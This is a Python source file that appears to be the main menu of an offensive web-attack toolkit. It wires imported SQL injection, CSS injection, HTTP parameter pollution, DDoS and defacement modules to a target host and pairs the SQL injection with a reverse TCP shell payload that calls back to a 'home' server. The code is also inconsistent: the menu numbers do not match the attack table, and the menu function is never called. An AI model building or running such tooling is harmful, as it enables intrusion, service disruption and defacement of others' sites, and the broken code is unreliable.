from SwipeDown.SwipeDown.inject import sqlInject, cssInject
from SwipeDown.SwipeDown.parameter import httpPollute
from SwipeDown.SwipeDown.disrupt.deny import ddos, deface
from persist import pingClient as pc, pingServer as ps
from SwipeDown.SwipeDown.payload.Python_Reverse_TCP import reverse_tcp


class Main:
    # Establish host/home vars
    home = ps.ip
    home_port = ps.port
    host = pc.ip
    hPort = pc.port

    # set the file to write info to
    f = open('target.json', "r")

    # Menu function
    def on_start(self, question):
        question = input('''
            Available methods of attack are as follows:
            1) Vuln Scan
            2) SQL Injection
            3) HTTP Parameter Pollution
            4) CSS Injection
            5) Deface
            6) DDoS
            Select Attack Method: ''')

        attacks = {
            1: sqlInject(reverse_tcp),
            2: httpPollute(),
            3: cssInject(),
            4: deface(),
            5: ddos()
        }
        return attacks

# Start
def init():
    if __name__ == '__main__':
        Main()
